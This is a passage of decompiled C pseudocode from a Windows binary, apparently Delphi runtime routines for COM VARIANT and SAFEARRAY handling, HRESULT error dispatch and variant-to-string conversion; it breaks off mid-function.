  local_1c = 0;
  local_20 = (byte *)0x0;
  puStack48 = &LAB_0040e62b;
  puStack52 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack52;
  FUN_00410058(param_1,&local_18);
  local_14 = local_18;
  local_10 = 0xb;
  FUN_00410058(param_2,&local_1c);
  local_c = local_1c;
  local_8 = 0xb;
  piVar3 = &local_14;
  uVar2 = 1;
  FUN_0040658c((int **)PTR_PTR_DAT_004414f0,(int *)&local_20);
  iVar1 = FUN_0040b8f8((int)&DAT_0040e0b0,'\x01',local_20,uVar2,piVar3);
  FUN_00404208(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack52 = &LAB_0040e632;
  FUN_004047cc((int *)&local_20,3);
  return;
}



void FUN_0040e638(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 *local_8;
  
  puStack12 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack16 = &LAB_0040e682;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  FUN_0040658c((int **)PTR_PTR_DAT_0044145c,(int *)&local_8);
  piVar1 = FUN_0040b8bc((int *)&DAT_0040e2a8,'\x01',local_8);
  FUN_00404208((int)piVar1);
  *in_FS_OFFSET = uStack20;
  puStack12 = &LAB_0040e689;
  puStack16 = (undefined *)0x40e681;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_0040e68c(DWORD param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 *unaff_EBX;
  undefined4 *in_FS_OFFSET;
  byte *local_44;
  int local_40;
  undefined4 local_3c;
  undefined local_38;
  DWORD local_34;
  undefined local_30;
  int local_2c;
  undefined4 local_28;
  undefined4 *in_stack_ffffffdc;
  undefined4 *puVar3;
  undefined4 *local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_14 = (undefined4 *)&stack0xfffffffc;
  iVar2 = 8;
  do {
    local_8 = (undefined4 *)0x0;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  local_18 = (undefined4 *)&LAB_0040e8d1;
  local_1c = (undefined4 *)*in_FS_OFFSET;
  *in_FS_OFFSET = &local_1c;
  if ((int)param_1 < -0x7ffdfff5) {
    if (param_1 == 0x8002000a) {
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_0040658c((int **)PTR_PTR_DAT_004413b4,(int *)&local_c);
      piVar1 = FUN_0040b8bc((int *)&DAT_0040e0b0,'\x01',local_c);
      FUN_00404208((int)piVar1);
      goto LAB_0040e8a9;
    }
    if ((int)param_1 < -0x7ffdfffa) {
      if (param_1 == 0x80020005) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_0040e458();
        goto LAB_0040e8a9;
      }
      if (param_1 == 0x80004001) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_0040658c((int **)PTR_PTR_DAT_004414c8,(int *)&local_18);
        piVar1 = FUN_0040b8bc((int *)&DAT_0040e310,'\x01',local_18);
        FUN_00404208((int)piVar1);
        goto LAB_0040e8a9;
      }
      if (param_1 == 0x8000ffff) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_0040658c((int **)PTR_PTR_DAT_004413b0,(int *)&stack0xffffffdc);
        piVar1 = FUN_0040b8bc((int *)&DAT_0040e3dc,'\x01',in_stack_ffffffdc);
        FUN_00404208((int)piVar1);
        goto LAB_0040e8a9;
      }
    }
    else {
      if (param_1 == 0x80020008) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_0040658c((int **)PTR_PTR_DAT_00441574,(int *)&local_8);
        piVar1 = FUN_0040b8bc((int *)&DAT_0040e178,'\x01',local_8);
        FUN_00404208((int)piVar1);
        goto LAB_0040e8a9;
      }
      if (param_1 == 0x80020009) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_0040e548();
        goto LAB_0040e8a9;
      }
    }
  }
  else {
    if (param_1 == 0x8002000b) {
      FUN_0040658c((int **)PTR_PTR_DAT_00441530,(int *)&stack0xfffffff0);
      piVar1 = FUN_0040b8bc((int *)&DAT_0040e1dc,'\x01',unaff_EBX);
      FUN_00404208((int)piVar1);
      goto LAB_0040e8a9;
    }
    if (param_1 == 0x8002000d) {
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_0040658c((int **)PTR_PTR_DAT_004415a8,(int *)&local_14);
      piVar1 = FUN_0040b8bc((int *)&DAT_0040e240,'\x01',local_14);
      FUN_00404208((int)piVar1);
      goto LAB_0040e8a9;
    }
    if (param_1 == 0x8007000e) {
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_0040658c((int **)PTR_PTR_DAT_004413e8,(int *)&local_1c);
      piVar1 = FUN_0040b8bc((int *)&DAT_0040e374,'\x01',local_1c);
      FUN_00404208((int)piVar1);
      goto LAB_0040e8a9;
    }
    if (param_1 == 0x80070057) {
      puVar3 = (undefined4 *)0x40e820;
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_0040658c((int **)PTR_PTR_DAT_004413fc,(int *)&stack0xffffffe0);
      piVar1 = FUN_0040b8bc((int *)&DAT_0040e114,'\x01',puVar3);
      FUN_00404208((int)piVar1);
      goto LAB_0040e8a9;
    }
  }
  local_3c = *(undefined4 *)PTR_PTR_DAT_00441580;
  local_38 = 0xb;
  local_30 = 0;
  local_34 = param_1;
  local_14 = (undefined4 *)&stack0xfffffffc;
  FUN_0040b0b4(param_1,&local_40);
  local_2c = local_40;
  puVar3 = &local_3c;
  in_stack_ffffffdc = (undefined4 *)0x2;
  local_28 = 0x40e895;
  FUN_0040658c((int **)PTR_PTR_DAT_00441460,(int *)&local_44);
  local_28 = 0x40e8a4;
  iVar2 = FUN_0040b8f8((int)&DAT_004079d8,'\x01',local_44,in_stack_ffffffdc,puVar3);
  local_28 = 0x40e8a9;
  FUN_00404208(iVar2);
LAB_0040e8a9:
  *in_FS_OFFSET = in_stack_ffffffdc;
  local_1c = (undefined4 *)&LAB_0040e8d8;
  FUN_004047cc((int *)&local_44,2);
  FUN_004047cc((int *)&stack0xffffffdc,8);
  return;
}



void FUN_0040e8e0(DWORD param_1)

{
  if (param_1 != 0) {
    FUN_0040e68c(param_1);
  }
  return;
}



void FUN_0040e8ec(DWORD param_1,uint param_2,uint param_3)

{
  if (param_1 != 0) {
    if (param_1 == 0x80020005) {
      FUN_0040e4ac(param_2,param_3);
    }
    else if (param_1 == 0x8002000a) {
      FUN_0040e59c(param_2,param_3);
    }
    else {
      FUN_0040e68c(param_1);
    }
  }
  return;
}



void FUN_0040e920(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 *local_8;
  
  puStack12 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack16 = &LAB_0040e96a;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  FUN_0040658c((int **)PTR_PTR_DAT_00441364,(int *)&local_8);
  piVar1 = FUN_0040b8bc((int *)&DAT_0040e440,'\x01',local_8);
  FUN_00404208((int)piVar1);
  *in_FS_OFFSET = uStack20;
  puStack12 = &LAB_0040e971;
  puStack16 = (undefined *)0x40e969;
  FUN_004047a8((int *)&local_8);
  return;
}



uint FUN_0040e974(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  bool bVar1;
  uint uVar2;
  
  do {
    uVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8) + *(int *)(param_4 + -0x300 + param_1 * 8);
    bVar1 = *(int *)(param_4 + -0x100 + param_1 * 4) < (int)uVar2;
    uVar2 = uVar2 & 0xffffff00 | (uint)bVar1;
    param_1 = param_1 + -1;
    if (!bVar1) {
      return uVar2;
    }
  } while (-1 < param_1);
  return uVar2;
}



undefined4 FUN_0040e9a4(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  
  uVar3 = CONCAT31((int3)((uint)param_2 >> 8),1);
  piVar1 = (int *)(param_4 + -0x100 + param_1 * 4);
  *piVar1 = *piVar1 + 1;
  iVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8);
  if (iVar2 + *(int *)(param_4 + -0x300 + param_1 * 8) <= *(int *)(param_4 + -0x100 + param_1 * 4))
  {
    if (param_1 == 0) {
      uVar3 = 0;
    }
    else {
      *(int *)(param_4 + -0x100 + param_1 * 4) = iVar2;
      uVar3 = FUN_0040e9a4(param_1 + -1,param_4,iVar2,param_4);
    }
  }
  return uVar3;
}



void FUN_0040ea00(VARIANTARG *param_1,undefined4 param_2,undefined *param_3)

{
  uint uVar1;
  DWORD DVar2;
  undefined4 *puVar3;
  undefined4 uVar4;
  undefined *extraout_ECX;
  undefined *extraout_ECX_00;
  int *extraout_ECX_01;
  undefined *extraout_ECX_02;
  undefined *puVar5;
  VARIANTARG *pVVar6;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  VARIANTARG *extraout_EDX_02;
  VARIANTARG **ppVVar7;
  int iVar8;
  VARIANTARG *local_318;
  uint local_314;
  int local_310;
  SAFEARRAY *local_30c;
  VARIANTARG *local_308;
  VARIANTARG *local_304;
  undefined4 local_300 [127];
  VARIANTARG local_104 [16];
  
  local_308 = param_1;
  if (((param_1->n1).field_0x1 & 0x20) == 0) {
    FUN_0040e8e0(0x80070057);
    param_3 = extraout_ECX;
  }
  if ((*(ushort *)&local_308->n1 & 0xfff) == 0xc) {
    if ((*(ushort *)&local_308->n1 & 0x4000) == 0) {
      local_30c = *(SAFEARRAY **)&(local_308->n1).field_0x8;
    }
    else {
      local_30c = **(SAFEARRAY ***)&(local_308->n1).field_0x8;
    }
    uVar1 = (uint)local_30c->cDims;
    pVVar6 = local_308;
    local_314 = uVar1;
    if (-1 < (int)(uVar1 - 1)) {
      iVar8 = 0;
      ppVVar7 = &local_304;
      do {
        DVar2 = SafeArrayGetLBound(local_30c,iVar8 + 1,(LONG *)(ppVVar7 + 1));
        FUN_0040e8e0(DVar2);
        DVar2 = SafeArrayGetUBound(local_30c,iVar8 + 1,&local_310);
        FUN_0040e8e0(DVar2);
        pVVar6 = (VARIANTARG *)((local_310 - (int)ppVVar7[1]) + 1);
        *ppVVar7 = pVVar6;
        iVar8 = iVar8 + 1;
        ppVVar7 = ppVVar7 + 2;
        uVar1 = uVar1 - 1;
        param_3 = extraout_ECX_00;
      } while (uVar1 != 0);
    }
    if (-1 < (int)(local_314 - 1)) {
      puVar3 = local_300;
      pVVar6 = local_104;
      uVar1 = local_314;
      do {
        param_3 = (undefined *)*puVar3;
        *(undefined **)&pVVar6->n1 = param_3;
        pVVar6 = (VARIANTARG *)&(pVVar6->n1).field_0x4;
        puVar3 = puVar3 + 2;
        uVar1 = uVar1 - 1;
      } while (uVar1 != 0);
    }
    do {
      iVar8 = local_314 - 1;
      puVar5 = &stack0xfffffffc;
      uVar1 = FUN_0040e974(iVar8,pVVar6,param_3,(int)&stack0xfffffffc);
      uVar4 = extraout_EDX;
      if ((char)uVar1 != '\0') {
        DVar2 = SafeArrayPtrOfIndex(local_30c,(LONG *)local_104,&local_318);
        FUN_0040e8e0(DVar2);
        FUN_0040ebf8(local_318,extraout_EDX_00,extraout_ECX_01);
        puVar5 = extraout_ECX_02;
        uVar4 = extraout_EDX_01;
      }
      param_3 = &stack0xfffffffc;
      uVar4 = FUN_0040e9a4(iVar8,uVar4,puVar5,(int)&stack0xfffffffc);
      pVVar6 = extraout_EDX_02;
    } while ((char)uVar4 != '\0');
  }
  DVar2 = VariantClear(local_308);
  FUN_0040e8e0(DVar2);
  return;
}



void FUN_0040eb7c(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  ushort uVar1;
  DWORD DVar2;
  int iVar3;
  uint unaff_ESI;
  int *local_c;
  
  uVar1 = *(ushort *)&param_1->n1;
  local_c = param_3;
  if (uVar1 < 0x14) {
    DVar2 = VariantClear(param_1);
    FUN_0040e8e0(DVar2);
  }
  else if (uVar1 == 0x100) {
    *(undefined2 *)&param_1->n1 = 0;
    FUN_004047a8((int *)&(param_1->n1).field_0x8);
  }
  else if (uVar1 == 0x101) {
    (*DAT_0044280c)(param_1);
  }
  else if ((uVar1 & 0x2000) == 0) {
    iVar3 = FUN_004104b4(unaff_ESI & 0xffff0000 | (uint)uVar1,&local_c);
    if ((char)iVar3 == '\0') {
      DVar2 = VariantClear(param_1);
      FUN_0040e8e0(DVar2);
    }
    else {
      (**(code **)(*local_c + 0x24))(local_c,param_1);
    }
  }
  else {
    FUN_0040ea00(param_1,param_2,(undefined *)param_3);
  }
  return;
}



void FUN_0040ebf8(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  if ((*(ushort *)&param_1->n1 & 0xbfe8) == 0) {
    *(undefined2 *)&param_1->n1 = 0;
    return;
  }
  FUN_0040eb7c(param_1,param_2,param_3);
  return;
}



VARIANTARG * FUN_0040ec0c(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  FUN_0040ebf8(param_1,param_2,param_3);
  return param_1;
}



uint FUN_0040ec14(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  bool bVar1;
  uint uVar2;
  
  do {
    uVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8) + *(int *)(param_4 + -0x300 + param_1 * 8);
    bVar1 = *(int *)(param_4 + -0x100 + param_1 * 4) < (int)uVar2;
    uVar2 = uVar2 & 0xffffff00 | (uint)bVar1;
    param_1 = param_1 + -1;
    if (!bVar1) {
      return uVar2;
    }
  } while (-1 < param_1);
  return uVar2;
}



undefined4 FUN_0040ec44(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  
  uVar3 = CONCAT31((int3)((uint)param_2 >> 8),1);
  piVar1 = (int *)(param_4 + -0x100 + param_1 * 4);
  *piVar1 = *piVar1 + 1;
  iVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8);
  if (iVar2 + *(int *)(param_4 + -0x300 + param_1 * 8) <= *(int *)(param_4 + -0x100 + param_1 * 4))
  {
    if (param_1 == 0) {
      uVar3 = 0;
    }
    else {
      *(int *)(param_4 + -0x100 + param_1 * 4) = iVar2;
      uVar3 = FUN_0040ec44(param_1 + -1,param_4,iVar2,param_4);
    }
  }
  return uVar3;
}



void FUN_0040eca0(VARIANTARG *param_1,VARIANTARG *param_2,undefined *param_3)

{
  uint uVar1;
  DWORD DVar2;
  SAFEARRAY *psa;
  LONG *pLVar3;
  undefined4 uVar4;
  int *extraout_ECX;
  int *extraout_ECX_00;
  int *piVar5;
  undefined *extraout_ECX_01;
  undefined *puVar6;
  undefined *extraout_ECX_02;
  undefined *puVar7;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  LONG *extraout_EDX_01;
  LONG *pLVar8;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  LONG *extraout_EDX_04;
  UINT UVar9;
  SAFEARRAYBOUND *pSVar10;
  int iVar11;
  void *local_320;
  void *local_31c;
  SAFEARRAY *local_318;
  uint local_314;
  int local_310;
  code *local_30c;
  VARIANTARG *local_308;
  SAFEARRAYBOUND local_304 [64];
  LONG local_104 [64];
  
  local_30c = (code *)param_3;
  local_308 = param_1;
  if (((param_2->n1).field_0x1 & 0x20) == 0) {
    FUN_0040e8e0(0x80070057);
  }
  if ((*(ushort *)&param_2->n1 & 0xfff) == 0xc) {
    if ((*(ushort *)&param_2->n1 & 0x4000) == 0) {
      local_318 = *(SAFEARRAY **)&(param_2->n1).field_0x8;
    }
    else {
      local_318 = **(SAFEARRAY ***)&(param_2->n1).field_0x8;
    }
    uVar1 = (uint)local_318->cDims;
    local_314 = uVar1;
    if (-1 < (int)(uVar1 - 1)) {
      iVar11 = 0;
      pSVar10 = local_304;
      do {
        DVar2 = SafeArrayGetLBound(local_318,iVar11 + 1,&pSVar10->lLbound);
        FUN_0040e8e0(DVar2);
        DVar2 = SafeArrayGetUBound(local_318,iVar11 + 1,&local_310);
        FUN_0040e8e0(DVar2);
        pSVar10->cElements = (local_310 - pSVar10->lLbound) + 1;
        iVar11 = iVar11 + 1;
        pSVar10 = pSVar10 + 1;
        uVar1 = uVar1 - 1;
      } while (uVar1 != 0);
    }
    psa = SafeArrayCreate(0xc,local_314,local_304);
    piVar5 = extraout_ECX;
    uVar4 = extraout_EDX;
    if (psa == (SAFEARRAY *)0x0) {
      FUN_0040e638();
      piVar5 = extraout_ECX_00;
      uVar4 = extraout_EDX_00;
    }
    FUN_0040ebf8(local_308,uVar4,piVar5);
    *(undefined2 *)&local_308->n1 = 0x200c;
    *(SAFEARRAY **)&(local_308->n1).field_0x8 = psa;
    puVar6 = extraout_ECX_01;
    pLVar8 = extraout_EDX_01;
    if (-1 < (int)(local_314 - 1)) {
      pLVar3 = &local_304[0].lLbound;
      pLVar8 = local_104;
      UVar9 = local_314;
      do {
        puVar6 = (undefined *)*pLVar3;
        *pLVar8 = (LONG)puVar6;
        pLVar8 = pLVar8 + 1;
        pLVar3 = pLVar3 + 2;
        UVar9 = UVar9 - 1;
      } while (UVar9 != 0);
    }
    do {
      iVar11 = local_314 - 1;
      puVar7 = &stack0xfffffffc;
      uVar1 = FUN_0040ec14(iVar11,pLVar8,puVar6,(int)&stack0xfffffffc);
      uVar4 = extraout_EDX_02;
      if ((char)uVar1 != '\0') {
        DVar2 = SafeArrayPtrOfIndex(local_318,local_104,&local_31c);
        FUN_0040e8e0(DVar2);
        DVar2 = SafeArrayPtrOfIndex(psa,local_104,&local_320);
        FUN_0040e8e0(DVar2);
        (*local_30c)(local_320,local_31c);
        puVar7 = extraout_ECX_02;
        uVar4 = extraout_EDX_03;
      }
      puVar6 = &stack0xfffffffc;
      uVar4 = FUN_0040ec44(iVar11,uVar4,puVar7,(int)&stack0xfffffffc);
      pLVar8 = extraout_EDX_04;
    } while ((char)uVar4 != '\0');
  }
  else {
    DVar2 = VariantCopy(local_308,param_2);
    FUN_0040e8e0(DVar2);
  }
  return;
}



void FUN_0040ee74(VARIANTARG *param_1,VARIANTARG *param_2,int *param_3)

{
  ushort uVar1;
  DWORD DVar2;
  int iVar3;
  uint unaff_EDI;
  int *local_10;
  
  local_10 = param_3;
  if ((*(ushort *)&param_1->n1 & 0xbfe8) != 0) {
    FUN_0040eb7c(param_1,param_2,param_3);
  }
  uVar1 = *(ushort *)&param_2->n1;
  if (uVar1 < 0x14) {
    DVar2 = VariantCopy(param_1,param_2);
    FUN_0040e8e0(DVar2);
  }
  else if (uVar1 == 0x100) {
    *(undefined2 *)&param_1->n1 = 0x100;
    *(undefined4 *)&(param_1->n1).field_0x8 = 0;
    FUN_004047fc((int *)&(param_1->n1).field_0x8,*(undefined4 **)&(param_2->n1).field_0x8);
  }
  else if (uVar1 == 0x101) {
    *(undefined2 *)&param_1->n1 = 0x101;
    *(undefined4 *)&(param_1->n1).field_0x8 = *(undefined4 *)&(param_2->n1).field_0x8;
    (*DAT_00442814)(param_1);
  }
  else if ((uVar1 & 0x2000) == 0) {
    iVar3 = FUN_004104b4(unaff_EDI & 0xffff0000 | (uint)uVar1,&local_10);
    if ((char)iVar3 == '\0') {
      DVar2 = VariantCopy(param_1,param_2);
      FUN_0040e8e0(DVar2);
    }
    else {
      (**(code **)(*local_10 + 0x28))(local_10,param_1,param_2,0);
    }
  }
  else {
    FUN_0040eca0(param_1,param_2,&LAB_0040ee6c);
  }
  return;
}



void FUN_0040ef20(VARIANTARG *param_1,VARIANTARG *param_2,int *param_3)

{
  if (param_1 != param_2) {
    if ((*(ushort *)&param_2->n1 & 0xbfe8) == 0) {
      if ((*(ushort *)&param_1->n1 & 0xbfe8) != 0) {
        FUN_0040eb7c(param_1,param_2,param_3);
      }
      *(undefined4 *)&param_1->n1 = *(undefined4 *)&param_2->n1;
      *(undefined4 *)&(param_1->n1).field_0x4 = *(undefined4 *)&(param_2->n1).field_0x4;
      *(undefined4 *)&(param_1->n1).field_0x8 = *(undefined4 *)&(param_2->n1).field_0x8;
      *(undefined4 *)&(param_1->n1).field_0xc = *(undefined4 *)&(param_2->n1).field_0xc;
    }
    else {
      FUN_0040ee74(param_1,param_2,param_3);
    }
  }
  return;
}



void FUN_0040ef64(BSTR *param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 undefined4 param_5)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  
  FUN_00404e54(param_1);
  DVar1 = (**(code **)PTR_DAT_004413bc)();
  FUN_0040e8ec(DVar1,CONCAT22(extraout_var_00,6),CONCAT22(extraout_var,8));
  return;
}



void FUN_0040ef9c(BSTR *param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 undefined4 param_5)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  
  FUN_00404e54(param_1);
  DVar1 = (**(code **)PTR_DAT_00441498)();
  FUN_0040e8ec(DVar1,CONCAT22(extraout_var_00,7),CONCAT22(extraout_var,8));
  return;
}



void FUN_0040efd4(undefined4 param_1,BSTR *param_2)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack40;
  undefined *puStack36;
  undefined *puStack32;
  byte *local_14;
  byte *local_10;
  byte *local_c;
  byte *local_8;
  
  puStack32 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  local_c = (byte *)0x0;
  local_10 = (byte *)0x0;
  local_14 = (byte *)0x0;
  puStack36 = &LAB_0040f08a;
  uStack40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack40;
  FUN_00404e54(param_2);
  DVar1 = (**(code **)PTR_DAT_00441534)();
  FUN_0040e8ec(DVar1,CONCAT22(extraout_var_00,0xb),CONCAT22(extraout_var,8));
  if (DAT_0043f344 != '\0') {
    if (DAT_0043f344 == '\x01') {
      FUN_00404a30((LPSTR *)&local_c,*param_2);
      FUN_00407e10(local_c,&local_8);
      FUN_00404fa0(param_2,(LPCSTR)local_8);
    }
    else if (DAT_0043f344 == '\x02') {
      FUN_00404a30((LPSTR *)&local_14,*param_2);
      FUN_00407dd4(local_14,&local_10);
      FUN_00404fa0(param_2,(LPCSTR)local_10);
    }
    else {
      FUN_0040e548();
    }
  }
  *in_FS_OFFSET = param_1;
  FUN_004047cc((int *)&local_14,4);
  return;
}



void FUN_0040f098(undefined2 *param_1,LPSTR *param_2)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  int *in_FS_OFFSET;
  LPCWSTR *ppWVar2;
  int iStack60;
  undefined *puStack56;
  int iStack48;
  undefined *puStack44;
  undefined *puStack40;
  BSTR local_1c;
  LPCWSTR local_18;
  undefined local_14 [16];
  
  puStack40 = &stack0xfffffffc;
  local_18 = (LPCWSTR)0x0;
  local_1c = (BSTR)0x0;
  puStack44 = &LAB_0040f157;
  iStack48 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&iStack48;
  puStack56 = (undefined *)0x40f0c3;
  VariantInit((VARIANTARG *)local_14);
  puStack56 = &LAB_0040f135;
  iStack60 = *in_FS_OFFSET;
  *in_FS_OFFSET = (int)&iStack60;
  DVar1 = (**(code **)PTR_DAT_0044154c)();
  FUN_0040e8ec(DVar1,CONCAT22(extraout_var_00,*param_1),CONCAT22(extraout_var,0x100));
  ppWVar2 = &local_18;
  FUN_00404f64(&local_1c,local_14._8_4_);
  FUN_00405050((uint)local_1c,1,0x7fffffff,ppWVar2);
  FUN_00404a30(param_2,local_18);
  *in_FS_OFFSET = (int)local_14;
  FUN_0040ebf8((VARIANTARG *)local_14,local_14,(int *)0x400);
  return;
}



void FUN_0040f164(VARIANTARG *param_1,LPSTR *param_2)

{
  int *extraout_ECX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY40;
  undefined *puStackY36;
  int *piVar1;
  VARIANTARG local_14;
  
  piVar1 = (int *)&stack0xfffffffc;
  puStackY36 = (undefined *)0x40f179;
  VariantInit(&local_14);
  puStackY36 = &DAT_0040f1ba;
  uStackY40 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY40;
  FUN_0040ef20(&local_14,param_1,extraout_ECX);
  (*DAT_00442810)(&local_14);
  FUN_0040f24c(param_2,(ushort *)&local_14);
  *in_FS_OFFSET = uStackY40;
  puStackY36 = (undefined *)0x40f1b9;
  FUN_0040ebf8(&local_14,uStackY40,piVar1);
  return;
}



int FUN_0040f1c8(ushort *param_1,int *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY48;
  int *piStackY44;
  undefined local_20 [16];
  int *local_10;
  char local_9;
  int *local_8;
  
  if (param_2 != (int *)0x0) {
    *param_2 = 0;
  }
  local_8 = param_2;
  iVar2 = FUN_004104b4((uint)param_2 & 0xffff0000 | (uint)*param_1,&local_10);
  local_9 = (char)iVar2;
  if (local_9 != '\0') {
    piStackY44 = (int *)0x40f1fc;
    VariantInit((VARIANTARG *)local_20);
    piStackY44 = (int *)&LAB_0040f23d;
    uStackY48 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStackY48;
    (**(code **)(*local_10 + 0x1c))(local_10,local_20,param_1);
    FUN_004047fc(local_8,local_20._8_4_);
    piVar1 = piStackY44;
    *in_FS_OFFSET = 0x100;
    piStackY44 = (int *)0x40f244;
    uStackY48 = 0x40f23c;
    iVar2 = FUN_0040ebf8((VARIANTARG *)local_20,0x100,piVar1);
    return iVar2;
  }
  return iVar2;
}



void FUN_0040f24c(LPSTR *param_1,ushort *param_2)

{
  ushort uVar1;
  int *piVar2;
  int iVar3;
  undefined uVar4;
  undefined4 *unaff_EBX;
  undefined4 *unaff_ESI;
  LPCWSTR *in_FS_OFFSET;
  undefined4 *local_7c;
  undefined4 *local_78;
  undefined4 *local_74;
  undefined4 *local_70;
  undefined4 *local_6c;
  undefined4 *local_68;
  undefined4 *local_64;
  LPCWSTR local_60;
  LPCWSTR local_5c;
  LPCWSTR local_58;
  undefined4 *local_54;
  undefined4 *local_50;
  undefined4 *local_4c;
  undefined4 *local_48;
  undefined4 *local_44;
  undefined4 *local_40;
  undefined4 *local_3c;
  undefined4 *local_38;
  undefined4 *local_34;
  undefined4 *local_30;
  undefined4 *in_stack_ffffffd4;
  LPCWSTR in_stack_ffffffd8;
  undefined uVar5;
  undefined2 uVar6;
  LPCWSTR local_20;
  LPCWSTR local_1c;
  BSTR local_18;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_18 = (BSTR)&stack0xfffffffc;
  iVar3 = 0xf;
  do {
    local_8 = (undefined4 *)0x0;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  local_1c = (LPCWSTR)&DAT_0040f783;
  local_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = (LPCWSTR)&local_20;
  uVar1 = *param_2;
  uVar4 = (undefined)uVar1;
  switch(uVar1) {
  case 0:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_004047a8((int *)param_1);
    break;
  case 1:
    local_18 = (BSTR)&stack0xfffffffc;
    if (DAT_0043f33c != '\0') {
      local_18 = (BSTR)&stack0xfffffffc;
      FUN_0040e4ac(1,0x100);
    }
    FUN_004047fc((int *)param_1,DAT_0043f340);
    break;
  case 2:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040803c((int)(short)param_2[4],(int *)&local_8);
    FUN_004047fc((int *)param_1,local_8);
    break;
  case 3:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040803c(*(uint *)(param_2 + 4),(int *)&local_c);
    FUN_004047fc((int *)param_1,local_c);
    break;
  case 4:
    local_30 = (undefined4 *)0x40f354;
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_004096a8((int *)&stack0xfffffff0,uVar4,0,SUB101((float10)*(float *)(param_2 + 4),0));
    FUN_004047fc((int *)param_1,unaff_EBX);
    break;
  case 5:
    local_30 = (undefined4 *)0x40f375;
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_004096a8((int *)&stack0xffffffec,uVar4,0,SUB101((float10)*(double *)(param_2 + 4),0));
    FUN_004047fc((int *)param_1,unaff_ESI);
    break;
  case 6:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040ef64(&local_18,uVar4,0,*(undefined4 *)(param_2 + 4),*(undefined4 *)(param_2 + 6));
    FUN_00404a30(param_1,local_18);
    break;
  case 7:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040ef9c(&local_1c,uVar4,0,*(undefined4 *)(param_2 + 4),*(undefined4 *)(param_2 + 6));
    FUN_00404a30(param_1,local_1c);
    break;
  case 8:
    uVar4 = SUB41(&local_20,0);
    uVar5 = (undefined)((uint)&local_20 >> 8);
    uVar6 = (undefined2)((uint)&local_20 >> 0x10);
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_00404f64((BSTR *)&stack0xffffffdc,*(OLECHAR **)(param_2 + 4));
    FUN_00405050(CONCAT22(uVar6,CONCAT11(uVar5,uVar4)),1,0x7fffffff,
                 (BSTR *)CONCAT22(uVar6,CONCAT11(uVar5,uVar4)));
    FUN_00404a30(param_1,local_20);
    break;
  case 9:
  case 0xd:
    local_18 = (BSTR)&stack0xfffffffc;
    FUN_0040f098(param_2,(LPSTR *)&local_40);
    FUN_004047fc((int *)param_1,local_40);
    break;
  default:
    if (uVar1 == 0x100) {
      local_18 = (BSTR)&stack0xfffffffc;
      FUN_004047fc((int *)param_1,*(undefined4 **)(param_2 + 4));
    }
    else if ((ushort)(uVar1 - 0x101) == 0) {
      local_18 = (BSTR)&stack0xfffffffc;
      FUN_0040f164((VARIANTARG *)param_2,(LPSTR *)&local_44);
